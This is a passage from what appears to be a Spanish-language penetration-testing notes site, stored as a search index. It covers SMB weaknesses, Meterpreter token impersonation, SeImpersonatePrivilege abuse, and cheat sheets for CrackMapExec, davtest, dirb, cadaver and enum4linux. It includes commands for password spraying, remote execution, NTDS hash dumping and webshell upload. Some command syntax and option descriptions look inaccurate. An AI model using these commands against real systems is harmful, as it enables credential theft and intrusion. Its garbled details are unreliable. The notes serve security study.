red, especialmente en sistemas [[Windows]].</p>"},{"location":"operating-systems/windows/protocols/server-message-block/#caracteristicas-de-smb","title":"\ud83d\udccc Caracter\u00edsticas de SMB","text":"<p>\u2705 Protocolo cliente-servidor: Un cliente solicita acceso a un recurso y un servidor lo proporciona. \u2705 Autenticaci\u00f3n y permisos: Permite controlar el acceso a archivos y carpetas. \u2705 Transparencia de red: Permite que los recursos compartidos se usen como si estuvieran en el equipo local. \u2705 Compatibilidad con Windows, Linux y macOS: Puede implementarse en Linux y macOS con Samba.</p>"},{"location":"operating-systems/windows/protocols/server-message-block/#versiones-de-smb","title":"\ud83d\udd0e Versiones de SMB","text":"Versi\u00f3n A\u00f1o Caracter\u00edsticas SMBv1 1984 Obsoleto, inseguro (usado en ataques como WannaCry). SMBv2 2006 Mejor rendimiento, menos uso de ancho de banda. SMBv3 2012 Cifrado de extremo a extremo, m\u00e1s seguridad. <p>\u274c SMBv1 est\u00e1 desactualizado y debe desactivarse para evitar vulnerabilidades.</p>"},{"location":"operating-systems/windows/protocols/server-message-block/#vulnerabilidades-y-ataques-comunes","title":"\u26a0\ufe0f Vulnerabilidades y ataques comunes","text":"<ul> <li>EternalBlue (MS17-010) \u2192 Explotado por el ransomware WannaCry.</li> <li>Relay Attack \u2192 Robo de credenciales mediante ataques de intermediario (MITM).</li> <li>Null Sessions \u2192 Accesos an\u00f3nimos mal configurados pueden filtrar informaci\u00f3n sensible.</li> </ul>"},{"location":"operating-systems/windows/vulns/privilege-escalation/load-incognito/","title":"load incognito","text":"<p>El comando <code>load incognito</code> en Meterpreter se utiliza para cargar un plugin de Meterpreter que permite suplantar (o robar) credenciales de Windows almacenadas en el sistema. Este plugin es \u00fatil cuando se tiene un permiso de suplantaci\u00f3n de identidad (como el <code>SeImpersonatePrivilege</code>) porque facilita el acceso a los tokens de autenticaci\u00f3n de otros usuarios en la m\u00e1quina comprometida.</p>"},{"location":"operating-systems/windows/vulns/privilege-escalation/load-incognito/#funcion-de-load-incognito-en-meterpreter","title":"Funci\u00f3n de <code>load incognito</code> en Meterpreter:","text":"<p>El plugin <code>incognito</code> en Meterpreter permite a un atacante realizar las siguientes acciones en una m\u00e1quina comprometida:</p> <ol> <li>Ver tokens de acceso: Permite listar los tokens de acceso disponibles en el sistema, que corresponden a las credenciales de los usuarios que est\u00e1n autenticados o que se encuentran en sesiones activas.</li> <li>Suplantar a un usuario (Impersonaci\u00f3n): Utilizando los tokens de otros usuarios, un atacante puede suplantar a otro usuario y ejecutar comandos y acciones en su nombre, obteniendo acceso a los recursos a los que ese usuario tiene acceso.</li> </ol>"},{"location":"operating-systems/windows/vulns/privilege-escalation/load-incognito/#como-funciona-el-plugin-incognito","title":"C\u00f3mo funciona el plugin Incognito:","text":"<p>Cuando ejecutas <code>load incognito</code>, se activa el plugin y permite realizar varias operaciones relacionadas con la suplantaci\u00f3n de identidad en el sistema. Algunas de las acciones m\u00e1s comunes que se pueden realizar una vez cargado el plugin son:</p> <ol> <li> <p>Listar tokens: Puedes ver los tokens de acceso de otros usuarios, lo que te permite identificar qu\u00e9 usuarios est\u00e1n autenticados y qu\u00e9 privilegios tienen.</p> <p>Comando:</p> <p><code>shell incognito_list_tokens</code></p> <p>Este comando muestra todos los tokens de usuario en el sistema que se pueden suplantar.</p> </li> <li> <p>Suplantar un token: Puedes suplantar el token de otro usuario (por ejemplo, un usuario con privilegios elevados como un administrador) para ejecutar comandos en su nombre.</p> <p>Comando:</p> <p><code>shell incognito_impersonate_token &lt;token&gt;</code></p> <p>Aqu\u00ed, <code>&lt;token&gt;</code> es el ID del token que quieres suplantar. Este token se obtiene de la lista de tokens que puedes ver con el comando <code>incognito_list_tokens</code>.</p> </li> <li> <p>Obtener credenciales almacenadas: Tambi\u00e9n puedes intentar recuperar credenciales de otros usuarios que est\u00e1n almacenadas en el sistema, como contrase\u00f1as en cach\u00e9 o credenciales de red. Esto puede ser \u00fatil para obtener acceso a otros recursos o m\u00e1quinas en la red.</p> </li> </ol>"},{"location":"operating-systems/windows/vulns/privilege-escalation/load-incognito/#requisitos-para-usar-load-incognito","title":"Requisitos para usar <code>load incognito</code>:","text":"<p>Para ejecutar el comando <code>load incognito</code> con \u00e9xito, necesitas tener ciertos permisos en el sistema. En particular, se necesita el privilegio de suplantaci\u00f3n de identidad (<code>SeImpersonatePrivilege</code>), ya que se est\u00e1 actuando en nombre de otro usuario.</p> <ul> <li><code>SeImpersonatePrivilege</code> es el privilegio necesario para poder suplantar a otro usuario despu\u00e9s de la autenticaci\u00f3n.</li> <li>Si tienes <code>SeImpersonatePrivilege</code>, puedes usar el comando <code>incognito</code> para interactuar con los tokens de otros usuarios y realizar suplantaci\u00f3n de identidad.</li> </ul>"},{"location":"operating-systems/windows/vulns/privilege-escalation/load-incognito/#ejemplo-de-flujo-con-load-incognito","title":"Ejemplo de flujo con <code>load incognito</code>:","text":"<ol> <li> <p>Cargar el plugin <code>incognito</code>:</p> <p><code>shell load incognito</code></p> </li> <li> <p>Listar los tokens disponibles (usuarios autenticados):</p> <p><code>shell list_tokens -u</code></p> </li> <li> <p>Suplantar a un usuario (por ejemplo, un administrador):</p> <p><code>shell impersonate_token USER\\\\Administrator</code></p> </li> <li> <p>Ahora, cualquier comando que ejecutes ser\u00e1 ejecutado con los privilegios del usuario cuyo token has suplantado.</p> </li> </ol>"},{"location":"operating-systems/windows/vulns/privilege-escalation/load-incognito/#riesgos-y-uso-en-ataques","title":"Riesgos y uso en ataques:","text":"<p>El uso del plugin <code>incognito</code> es muy \u00fatil en ataques de escalada de privilegios y movimiento lateral dentro de redes comprometidas. Permite a un atacante tomar el control de cuentas de usuario con m\u00e1s privilegios sin necesidad de conocer sus contrase\u00f1as. En escenarios de pivoting o post-explotaci\u00f3n, esto puede ser esencial para obtener acceso a m\u00e1s recursos en la red, especialmente si el atacante est\u00e1 buscando alcanzar un nivel de privilegio m\u00e1s alto (por ejemplo, obtener acceso como administrador o SYSTEM).</p>"},{"location":"operating-systems/windows/vulns/privilege-escalation/load-incognito/#resumen","title":"Resumen:","text":"<p>El comando <code>load incognito</code> en Meterpreter permite cargar el plugin Incognito, que facilita la suplantaci\u00f3n de identidad en sistemas Windows. Este plugin te permite robar tokens de usuario y ejecutar acciones como si fueras ese usuario, lo que es especialmente \u00fatil para escalar privilegios o moverse lateralmente en una red comprometida. Para utilizar este plugin, debes tener permisos de suplantaci\u00f3n de identidad (como <code>SeImpersonatePrivilege</code>), lo cual es necesario para manipular tokens de otros usuarios.</p>"},{"location":"operating-systems/windows/vulns/privilege-escalation/selmporesionateprivilege-privilege/","title":"SelmporesionatePrivilege Privilege","text":"<p>El <code>SeImpersonatePrivilege</code> (tambi\u00e9n conocido como \"Impersonate a client after authentication\") es un privilegio de seguridad en Windows que permite a un usuario o proceso suplantar (o hacerse pasar por) a otro usuario despu\u00e9s de que se haya autenticado en el sistema. Este privilegio es crucial en muchos escenarios de administraci\u00f3n de sistemas y en algunos ataques de seguridad.</p>"},{"location":"operating-systems/windows/vulns/privilege-escalation/selmporesionateprivilege-privilege/#descripcion-del-seimpersonateprivilege","title":"Descripci\u00f3n del <code>SeImpersonatePrivilege</code>:","text":"<p>Este privilegio permite que un proceso act\u00fae en nombre de otro usuario, lo que puede incluir la posibilidad de acceder a recursos protegidos como si fuera ese usuario. Este privilegio es utilizado com\u00fanmente por:</p> <ul> <li>Servicios que necesitan interactuar con el sistema en nombre de otros usuarios (por ejemplo, servicios de red).</li> <li>Herramientas administrativas como WinRM (Windows Remote Management) o PowerShell Remoting, que permiten ejecutar comandos de forma remota en nombre de otros usuarios.</li> <li>T\u00e9cnicas de ataque, como suplantaci\u00f3n de identidad (impersonation), donde un atacante puede obtener acceso a los recursos de un usuario autenticado sin conocer la contrase\u00f1a de ese usuario.</li> </ul>"},{"location":"operating-systems/windows/vulns/privilege-escalation/selmporesionateprivilege-privilege/#que-significa-tener-el-privilegio-seimpersonateprivilege","title":"\u00bfQu\u00e9 significa tener el privilegio <code>SeImpersonatePrivilege</code>?","text":"<p>Cuando un proceso tiene el privilegio <code>SeImpersonatePrivilege</code>, puede suplantar la identidad de cualquier usuario que haya iniciado sesi\u00f3n en el sistema. Esto significa que el proceso puede:</p> <ol> <li>Acceder a recursos protegidos a los que el usuario autenticado tiene acceso.</li> <li>Ejecutar acciones en nombre de ese usuario sin que el sistema distinga entre el proceso original y el usuario impersonado.</li> <li>Interactuar con otros servicios y aplicaciones de la misma forma que lo har\u00eda el usuario autenticado.</li> </ol>"},{"location":"operating-systems/windows/vulns/privilege-escalation/selmporesionateprivilege-privilege/#como-obtener-el-privilegio-seimpersonateprivilege","title":"\u00bfC\u00f3mo obtener el privilegio <code>SeImpersonatePrivilege</code>?","text":"<p>En general, <code>SeImpersonatePrivilege</code> est\u00e1 asignado a cuentas administrativas o sistemas de confianza en el sistema operativo. Para verificar si tu cuenta tiene este privilegio, puedes usar el siguiente comando:</p> <pre><code>whoami /priv\n</code></pre> <p>Este comando te muestra los privilegios que tiene tu cuenta. Si tienes el privilegio <code>SeImpersonatePrivilege</code>, deber\u00eda aparecer en la lista, junto con una breve descripci\u00f3n.</p> <p>Ejemplo de salida:</p> <pre><code>PRIVILEGES INFORMATION\n----------------------\nPrivilege Name                    Description\n=============================== ====================================\nSeShutdownPrivilege               Shut down the system\nSeImpersonatePrivilege            Impersonate a client after authentication\nSeTimeZonePrivilege               Change the system time zone\n</code></pre>"},{"location":"operating-systems/windows/vulns/privilege-escalation/selmporesionateprivilege-privilege/#como-se-usa-en-un-ataque","title":"\u00bfC\u00f3mo se usa en un ataque?","text":"<p>Este privilegio es a menudo utilizado en ataques \"Pass-the-Ticket\" o \"Pass-the-Hash\", donde un atacante intenta ejecutar comandos o acceder a recursos usando las credenciales de otro usuario, pero sin necesidad de conocer la contrase\u00f1a real.</p> <p>Si un atacante tiene acceso a <code>SeImpersonatePrivilege</code> en una m\u00e1quina y sabe c\u00f3mo abusar de la suplantaci\u00f3n de identidad, puede obtener acceso a los recursos de otro usuario sin tener que ingresar sus credenciales, solo actuando en su nombre.</p> <p>Por ejemplo:</p> <ul> <li>Si un atacante tiene acceso a una sesi\u00f3n administrativa en una m\u00e1quina y puede suplantar a un usuario con privilegios elevados, podr\u00e1 acceder a recursos a los que normalmente no tendr\u00eda acceso.</li> <li>La suplantaci\u00f3n puede ser utilizada para ejecutar programas maliciosos o realizar actividades como movimiento lateral en una red de Windows, permitiendo al atacante moverse entre m\u00e1quinas y ejecutar comandos de alto privilegio.</li> </ul>"},{"location":"operating-systems/windows/vulns/privilege-escalation/selmporesionateprivilege-privilege/#como-configurar-el-privilegio-seimpersonateprivilege","title":"\u00bfC\u00f3mo configurar el privilegio SeImpersonatePrivilege?","text":"<p>Este privilegio se configura a trav\u00e9s de la Pol\u00edtica de Seguridad Local en Windows. Si eres administrador del sistema, puedes asignar este privilegio a usuarios o grupos a trav\u00e9s de los siguientes pasos:</p> <ol> <li>Abrir la pol\u00edtica de seguridad local:<ul> <li>Escribe <code>secpol.msc</code> en la barra de b\u00fasqueda de Windows y presiona Enter.</li> </ul> </li> <li>Navegar a las pol\u00edticas locales:<ul> <li>En la ventana de Pol\u00edtica de seguridad local, expande la opci\u00f3n Pol\u00edticas locales y luego haz clic en Asignaci\u00f3n de derechos de usuario.</li> </ul> </li> <li>Editar \"Impersonate a client after authentication\":<ul> <li>Busca y haz doble clic en Impersonate a client after authentication.</li> </ul> </li> <li>Asignar privilegios:<ul> <li>Aqu\u00ed podr\u00e1s agregar usuarios o grupos que tendr\u00e1n el privilegio de suplantar a otros usuarios.</li> </ul> </li> </ol>"},{"location":"operating-systems/windows/vulns/privilege-escalation/selmporesionateprivilege-privilege/#resumen","title":"Resumen","text":"<ul> <li>El <code>SeImpersonatePrivilege</code> permite a un proceso o usuario suplantar la identidad de otro usuario despu\u00e9s de la autenticaci\u00f3n.</li> <li>Es com\u00fanmente utilizado por servicios de Windows, herramientas de administraci\u00f3n y tambi\u00e9n en ataques de escalada de privilegios.</li> <li>Este privilegio puede otorgar acceso a recursos protegidos y facilitar movimiento lateral en un entorno de red comprometido.</li> <li>Puedes verificar si tu cuenta tiene este privilegio usando el comando <code>whoami /priv</code>.</li> </ul>"},{"location":"tips-tools/cadaver-tips/","title":"Cadaver","text":"<p>[[Cadaver\ud83c\udff4\u200d\u2620\ufe0f]]</p>"},{"location":"tips-tools/cadaver-tips/#1-conectarse-a-un-servidor-webdav","title":"\ud83d\udccc 1. Conectarse a un servidor WebDAV","text":"<pre><code>cadaver http://target.com/webdav/\n</code></pre> <p>Esto abrir\u00e1 una sesi\u00f3n interactiva, y podr\u00e1s ingresar el nombre de usuario y la contrase\u00f1a si es necesario.</p>"},{"location":"tips-tools/cadaver-tips/#2-listar-archivos-en-un-directorio","title":"\ud83d\udccc 2. Listar Archivos en un Directorio","text":"<p>Una vez conectado, puedes usar el comando <code>ls</code> para listar los archivos en el directorio actual:</p> <pre><code>ls\n</code></pre> <p>Esto te mostrar\u00e1 los archivos y carpetas disponibles en el directorio remoto.</p>"},{"location":"tips-tools/cadaver-tips/#3-subir-un-archivo-al-servidor","title":"\ud83d\udccc 3. Subir un Archivo al Servidor","text":"<p>Para subir un archivo local al servidor WebDAV, usa el comando <code>put</code>:</p> <pre><code>put archivo_local.txt\n</code></pre> <p>Esto subir\u00e1 el archivo <code>archivo_local.txt</code> desde tu m\u00e1quina local al servidor.</p>"},{"location":"tips-tools/cadaver-tips/#4-descargar-un-archivo-desde-el-servidor","title":"\ud83d\udccc 4. Descargar un Archivo desde el Servidor","text":"<p>Para descargar un archivo del servidor WebDAV, usa el comando <code>get</code>:</p> <pre><code>get archivo_remoto.txt\n</code></pre> <p>Esto descargar\u00e1 el archivo <code>archivo_remoto.txt</code> del servidor a tu m\u00e1quina local.</p>"},{"location":"tips-tools/cadaver-tips/#5-crear-un-directorio-en-el-servidor","title":"\ud83d\udccc 5. Crear un Directorio en el Servidor","text":"<p>Si quieres crear un directorio remoto en el servidor, usa el comando <code>mkdir</code>:</p> <pre><code>mkdir nuevo_directorio\n</code></pre> <p>Esto crear\u00e1 un directorio llamado <code>nuevo_directorio</code> en el servidor WebDAV.</p>"},{"location":"tips-tools/cadaver-tips/#6-eliminar-un-archivo-en-el-servidor","title":"\ud83d\udccc 6. Eliminar un Archivo en el Servidor","text":"<p>Para eliminar un archivo remoto en el servidor, usa el comando <code>delete</code>:</p> <pre><code>delete archivo_a_borrar.txt\n</code></pre> <p>Esto eliminar\u00e1 el archivo <code>archivo_a_borrar.txt</code> del servidor WebDAV.</p>"},{"location":"tips-tools/cadaver-tips/#6-autenticacion","title":"\ud83d\udd39 6. Autenticaci\u00f3n","text":"<p>Si el servidor WebDAV requiere autenticaci\u00f3n b\u00e1sica, <code>cadaver</code> te pedir\u00e1 que ingreses el nombre de usuario y la contrase\u00f1a al intentar conectarte. Tambi\u00e9n puedes proporcionarlo directamente en la URL:</p> <pre><code>cadaver http://usuario:contrase\u00f1a@target.com/webdav/\n</code></pre>"},{"location":"tips-tools/cadaver-tips/#conclusion","title":"\ud83d\udd25 Conclusi\u00f3n","text":"<p><code>cadaver</code> es una herramienta \u00fatil para interactuar con servidores WebDAV a trav\u00e9s de la l\u00ednea de comandos. Puedes usarla para:</p> <p>\u2705 Subir y descargar archivos. \u2705 Crear, mover y eliminar directorios. \u2705 Navegar por los directorios remotos.</p>"},{"location":"tips-tools/crackmapexec-tips/","title":"Crackmapexec","text":""},{"location":"tips-tools/crackmapexec-tips/#uso-basico-de-crackmapexec-cme-en-smb","title":"\ud83d\udd39 Uso b\u00e1sico de [[Crackmapexec (CME)]] en SMB","text":""},{"location":"tips-tools/crackmapexec-tips/#1-escanear-un-objetivo-para-ver-si-smb-esta-disponible","title":"1\ufe0f\u20e3 Escanear un objetivo para ver si SMB est\u00e1 disponible","text":"<p><code>crackmapexec smb IP_O_HOST</code></p>"},{"location":"tips-tools/crackmapexec-tips/#2-enumerar-usuarios-en-smb","title":"2\ufe0f\u20e3 Enumerar usuarios en SMB","text":"<p><code>crackmapexec smb IP_O_HOST -u usuario -p contrase\u00f1a --users</code></p>"},{"location":"tips-tools/crackmapexec-tips/#2-enumerar-usuarios-mediante-rid-brute-forcing-en-smb","title":"2\ufe0f\u20e3 Enumerar usuarios mediante RID Brute-Forcing en SMB","text":"<p><code>crackmapexec smb IP_O_HOST -u guest -p '' --rid-brute</code></p>"},{"location":"tips-tools/crackmapexec-tips/#3-enumerar-recursos-compartidos-shares","title":"3\ufe0f\u20e3 Enumerar recursos compartidos (shares)","text":"<p><code>crackmapexec smb IP_O_HOST -u usuario -p contrase\u00f1a --shares</code></p>"},{"location":"tips-tools/crackmapexec-tips/#4-probar-una-lista-de-usuarios-y-contrasenas-en-smb","title":"4\ufe0f\u20e3 Probar una lista de usuarios y contrase\u00f1as en SMB","text":"<p><code>crackmapexec smb IP_O_HOST -u usuarios.txt -p contrase\u00f1as.txt</code></p> <p>Si quieres probar contra varios hosts en una red:</p> <p><code>crackmapexec smb 192.168.1.0/24 -u usuarios.txt -p contrase\u00f1as.txt</code></p>"},{"location":"tips-tools/crackmapexec-tips/#1-enumerar-usuarios-smb-con-un-diccionario-usando-crackmapexec","title":"\ud83d\udd39 1\ufe0f\u20e3 Enumerar usuarios SMB con un diccionario usando <code>crackmapexec</code>","text":"<p><code>crackmapexec</code> permite probar nombres de usuario en SMB sin necesidad de credenciales.</p> <p><code>crackmapexec smb IP_DEL_SERVIDOR -u diccionario.txt -p ''</code></p> <p>\ud83d\udd39 Ejemplo:</p> <p><code>crackmapexec smb 192.168.1.100 -u nombres.txt -p ''</code></p> <p>\u2705 Salida esperada (si el usuario existe):</p> <p><code>SMB         192.168.1.100    445    WIN-SERVER    [*] Guest login allowed SMB         192.168.1.100    445    WIN-SERVER    [+] Valid account: 'usuario1:' SMB         192.168.1.100    445    WIN-SERVER    [+] Valid account: 'admin:'</code></p>"},{"location":"tips-tools/crackmapexec-tips/#5-ejecucion-de-comandos-remotos","title":"5\ufe0f\u20e3 Ejecuci\u00f3n de comandos remotos","text":"<p>Si tienes credenciales v\u00e1lidas, puedes ejecutar un comando en el sistema remoto:</p> <p><code>crackmapexec smb IP_O_HOST -u usuario -p contrase\u00f1a -x \"whoami\"</code></p> <p>Tambi\u00e9n puedes cargar y ejecutar archivos <code>.exe</code> en la m\u00e1quina v\u00edctima:</p> <p><code>crackmapexec smb IP_O_HOST -u usuario -p contrase\u00f1a -X \"ruta/del/archivo.exe\"</code></p>"},{"location":"tips-tools/crackmapexec-tips/#movilidad-lateral-con-cme","title":"\ud83d\udd39 Movilidad lateral con CME","text":"<p>Si obtienes credenciales v\u00e1lidas, puedes utilizarlas para moverte en la red. Ejemplo de escaneo en toda la red para detectar m\u00e1s m\u00e1quinas donde funcionen las credenciales:</p> <p><code>crackmapexec smb 192.168.1.0/24 -u usuario -p contrase\u00f1a</code></p> <p>Si un usuario tiene permisos de administrador, puedes activar WinRM y obtener acceso remoto:</p> <p><code>crackmapexec winrm IP_O_HOST -u usuario -p contrase\u00f1a</code></p>"},{"location":"tips-tools/crackmapexec-tips/#deteccion-de-gpos-y-hashes-ntlm","title":"\ud83d\udd39 Detecci\u00f3n de GPOs y hashes NTLM","text":"<p>Puedes extraer informaci\u00f3n de pol\u00edticas de grupo (GPOs) o incluso credenciales en texto claro si hay configuraciones d\u00e9biles:</p> <p><code>crackmapexec smb IP_O_HOST -u usuario -p contrase\u00f1a --gpp-passwords</code></p> <p>Si tienes acceso a un equipo, puedes obtener hashes NTLM de usuarios para ataques Pass-the-Hash (PTH):</p> <p><code>crackmapexec smb IP_O_HOST -u usuario -p contrase\u00f1a --ntds</code></p>"},{"location":"tips-tools/davtest-tips/","title":"Davtest","text":"<p>[[davtest\ud83d\udcbb]]</p>"},{"location":"tips-tools/davtest-tips/#1-prueba-de-subida-de-archivos-automaticamente","title":"\ud83d\udccc 1. Prueba de subida de archivos autom\u00e1ticamente","text":"<p><code>davtest -url http://target.com/</code></p> <p>\u2705 Resultado esperado (ejemplo):</p> <p><code>[+] PUT /test.txt OK [-] PUT /shell.php FAILED [+] PUT /test.html OK</code></p> <p>\u27a1\ufe0f Significa que se pueden subir archivos <code>.txt</code> y <code>.html</code>, pero no <code>.php</code>.</p>"},{"location":"tips-tools/davtest-tips/#2-intentar-subir-un-archivo-especifico","title":"\ud83d\udccc 2. Intentar subir un archivo espec\u00edfico","text":"<p><code>davtest -url http://target.com/ -upload shell.php</code></p> <p>\u2705 Esto intenta subir <code>shell.php</code> manualmente para ver si es aceptado.</p>"},{"location":"tips-tools/davtest-tips/#3-intentar-mover-archivos-si-el-servidor-lo-permite","title":"\ud83d\udccc 3. Intentar mover archivos (si el servidor lo permite)","text":"<p><code>davtest -url http://target.com/ -move test.txt</code></p> <p>\u2705 Si <code>MOVE</code> est\u00e1 permitido, el archivo puede ser renombrado o movido.</p>"},{"location":"tips-tools/davtest-tips/#4-autenticacion-en-servidores-protegidos","title":"\ud83d\udccc 4. Autenticaci\u00f3n en servidores protegidos","text":"<p>Si el servidor requiere usuario y contrase\u00f1a:</p> <p><code>davtest -url http://target.com/ -auth admin:password</code></p> <p>\u2705 Esto intentar\u00e1 la prueba de subida usando autenticaci\u00f3n HTTP b\u00e1sica.</p>"},{"location":"tips-tools/davtest-tips/#5-limpiar-archivos-despues-de-la-prueba","title":"\ud83d\udccc 5. Limpiar archivos despu\u00e9s de la prueba","text":"<p><code>davtest -url http://target.com/ -clean</code></p> <p>\u2705 Si el servidor lo permite, borra los archivos subidos.</p>"},{"location":"tips-tools/davtest-tips/#6-deteccion-de-vulnerabilidades","title":"\ud83d\udd39 6. Detecci\u00f3n de Vulnerabilidades","text":"<p>Si el servidor permite subir archivos ejecutables (<code>.php</code>, <code>.jsp</code>, <code>.aspx</code>), podr\u00edas inyectar una webshell y obtener acceso remoto.</p> <p>![[Pasted image 20250226224459.png]]</p>"},{"location":"tips-tools/dirb-tips/","title":"Dirb","text":"<p>[[Dirb]] es una herramienta de fuzzing de directorios y archivos en aplicaciones web, similar a DirBuster, pero con una interfaz de l\u00ednea de comandos m\u00e1s simple. Al igual que DirBuster, <code>dirb</code> se usa para realizar un ataque de fuzzing y descubrir recursos ocultos, como directorios o archivos que no est\u00e1n f\u00e1cilmente accesibles desde el sitio web.</p>"},{"location":"tips-tools/dirb-tips/#caracteristicas-de-dirb","title":"Caracter\u00edsticas de <code>dirb</code>:","text":"<ul> <li>Fuzzing de directorios y archivos: Similar a DirBuster, <code>dirb</code> prueba rutas de directorios y archivos en el servidor web mediante un diccionario de palabras.</li> <li>Interfaz de l\u00ednea de comandos: <code>dirb</code> es m\u00e1s sencillo en comparaci\u00f3n con DirBuster porque no tiene interfaz gr\u00e1fica, pero es igualmente efectivo para la b\u00fasqueda de directorios y archivos.</li> <li>Soporte para autenticaci\u00f3n b\u00e1sica: Al igual que <code>dirbuster</code>, <code>dirb</code> permite usar autenticaci\u00f3n b\u00e1sica HTTP para acceder a sitios protegidos.</li> <li>Configuraci\u00f3n m\u00ednima: Es m\u00e1s f\u00e1cil de usar para aquellos que prefieren una herramienta basada en la terminal, sin muchas configuraciones adicionales.</li> </ul>"},{"location":"tips-tools/dirb-tips/#ejemplos-de-uso-de-dirb","title":"Ejemplos de uso de <code>dirb</code>:","text":""},{"location":"tips-tools/dirb-tips/#1-fuzzing-de-directorios-y-archivos-basicos","title":"1. Fuzzing de directorios y archivos b\u00e1sicos:","text":"<p>Este es el caso m\u00e1s com\u00fan, donde simplemente proporcionas la URL y un archivo de diccionario para comenzar el fuzzing. Aqu\u00ed hay un ejemplo:</p> <pre><code>dirb http://target.com /ruta/a/diccionario/wordlist.txt\n</code></pre> <ul> <li><code>http://target.com</code>: La URL del servidor donde deseas hacer fuzzing.</li> <li><code>/ruta/a/diccionario/wordlist.txt</code>: La ruta al archivo diccionario que contiene las palabras (rutas de directorios o archivos) que se utilizar\u00e1n para las pruebas.</li> </ul>"},{"location":"tips-tools/dirb-tips/#2-fuzzing-con-autenticacion-basica","title":"2. Fuzzing con autenticaci\u00f3n b\u00e1sica:","text":"<p>Si el sitio web requiere autenticaci\u00f3n b\u00e1sica (nombre de usuario y contrase\u00f1a), puedes usar <code>dirb</code> con el par\u00e1metro <code>-u</code> para especificar las credenciales de la siguiente manera:</p> <pre><code>dirb http://target.com /ruta/a/diccionario/wordlist.txt -u bob:password_123321\n</code></pre> <ul> <li><code>-u bob:password_123321</code>: Especifica las credenciales para la autenticaci\u00f3n b\u00e1sica HTTP en formato <code>usuario:contrase\u00f1a</code>.</li> </ul>"},{"location":"tips-tools/dirb-tips/#3-fuzzing-sin-mostrar-respuestas-404-para-evitar-ruido","title":"3. Fuzzing sin mostrar respuestas 404 (para evitar ruido):","text":"<p>Si prefieres no ver las respuestas 404 (que indican que un directorio o archivo no existe), puedes usar el par\u00e1metro <code>-s</code> para filtrar esas respuestas:</p> <pre><code>dirb http://target.com /ruta/a/diccionario/wordlist.txt -s 404\n</code></pre> <ul> <li><code>-s 404</code>: Muestra solo las respuestas que no son un error 404, es decir, aquellas que podr\u00edan ser directorios o archivos v\u00e1lidos.</li> </ul>"},{"location":"tips-tools/dirb-tips/#4-fuzzing-con-un-proxy","title":"4. Fuzzing con un proxy:","text":"<p>Si deseas pasar el tr\u00e1fico a trav\u00e9s de un proxy (como Burp Suite), puedes usar el par\u00e1metro <code>-p</code> para especificar la direcci\u00f3n del proxy:</p> <pre><code>dirb http://target.com /ruta/a/diccionario/wordlist.txt -p http://127.0.0.1:8080\n</code></pre> <ul> <li><code>-p http://127.0.0.1:8080</code>: Especifica que todo el tr\u00e1fico pase a trav\u00e9s de un proxy en la direcci\u00f3n 127.0.0.1:8080 (aseg\u00farate de que el proxy est\u00e9 configurado y ejecut\u00e1ndose en ese puerto).</li> </ul>"},{"location":"tips-tools/dirb-tips/#5-fuzzing-recursivo","title":"5. Fuzzing recursivo:","text":"<p><code>dirb</code> tambi\u00e9n permite realizar fuzzing recursivo, lo que significa que si encuentra un directorio v\u00e1lido, seguir\u00e1 buscando dentro de \u00e9l para descubrir otros directorios o archivos:</p> <pre><code>dirb http://target.com /ruta/a/diccionario/wordlist.txt -r\n</code></pre> <ul> <li><code>-r</code>: Activa la opci\u00f3n de b\u00fasqueda recursiva. Si se encuentra un directorio v\u00e1lido, <code>dirb</code> intentar\u00e1 buscar dentro de \u00e9l tambi\u00e9n.</li> </ul>"},{"location":"tips-tools/dirb-tips/#6-fuzzing-con-un-archivo-de-salida-para-guardar-los-resultados","title":"6. Fuzzing con un archivo de salida (para guardar los resultados):","text":"<p>Puedes guardar los resultados del fuzzing en un archivo de texto para analizarlos m\u00e1s tarde. Aqu\u00ed tienes un ejemplo:</p> <pre><code>dirb http://target.com /ruta/a/diccionario/wordlist.txt -o resultados.txt\n</code></pre> <ul> <li><code>-o resultados.txt</code>: Guarda la salida del fuzzing en el archivo <code>resultados.txt</code>.</li> </ul>"},{"location":"tips-tools/dirb-tips/#otras-opciones-utiles","title":"Otras opciones \u00fatiles:","text":"<ul> <li><code>-t &lt;n\u00famero&gt;</code>: Establece el n\u00famero de hilos (threads) para el fuzzing. Un valor mayor puede acelerar el proceso, pero depende de la capacidad del servidor y la red.</li> <li><code>-X &lt;extensiones&gt;</code>: Permite a\u00f1adir extensiones a las rutas durante el fuzzing. Por ejemplo, si quieres buscar directorios que terminen en <code>.php</code>, <code>.html</code>, etc., puedes hacer algo como esto:</li> </ul> <pre><code>dirb http://target.com /ruta/a/diccionario/wordlist.txt -X .php,.html\n</code></pre> <ul> <li><code>-S</code>: Desactiva el uso de HTTPS (por defecto, <code>dirb</code> intentar\u00e1 usar HTTPS si el sitio lo soporta).</li> </ul>"},{"location":"tips-tools/enum4linux-tips/","title":"Enum4Linux","text":""},{"location":"tips-tools/enum4linux-tips/#uso-basico","title":"\ud83d\udccc Uso B\u00e1sico","text":"<p>El [[enum4linux\ud83d\udc27]] el comando b\u00e1sico para enumerar informaci\u00f3n de un host es:</p> <p><code>enum4linux &lt;IP_DEL_OBJETIVO&gt;</code></p> <p>Ejemplo:</p> <p><code>enum4linux 192.168.1.10</code></p>"},{"location":"tips-tools/enum4linux-tips/#opciones-principales","title":"\ud83d\udccc Opciones Principales","text":"<p>Puedes ejecutar <code>enum4linux -h</code> para ver todas las opciones disponibles. Algunas de las m\u00e1s usadas son:</p> Opci\u00f3n Descripci\u00f3n <code>-U</code> Enumera usuarios. <code>-G</code> Enumera grupos. <code>-S</code> Enumera recursos compartidos (shares). <code>-P</code> Enumera pol\u00edticas de contrase\u00f1as. <code>-a</code> Ejecuta todas las opciones anteriores autom\u00e1ticamente. <p>Ejemplo para obtener solo los usuarios:</p> <p><code>enum4linux -U 192.168.1.10</code></p> <p>Ejemplo para obtener informaci\u00f3n completa:</p> <p><code>enum4linux -a 192.168.1.10</code></p>"},{"location":"tips-tools/enum4linux-tips/#autenticacion-con-credenciales","title":"\ud83d\udccc Autenticaci\u00f3n con Credenciales","text":"<p>Si tienes credenciales de usuario, puedes usarlas con:</p> <p><code>enum4linux -u usuario -p contrase\u00f1a &lt;IP_DEL_OBJETIVO&gt;</code></p> <p>O con hash NTLM en lugar de la contrase\u00f1a:</p> <p><code>enum4linux -u usuario -H 'LM:NT' &lt;IP_DEL_OBJETIVO&gt;</code></p>"},{"location":"tips-tools/enum4linux-tips/#alternativas-modernas","title":"\ud83d\udccc Alternativas Modernas","text":"<p>Dado que <code>enum4linux</code> ya no se actualiza, algunas alternativas m\u00e1s modernas incluyen:</p> <ul> <li><code>smbmap</code></li> <li><code>smbclient</code></li> <li><code>crackmapexec smb</code></li> </ul> <p>Ejemplo con <code>smbmap</code>:</p> 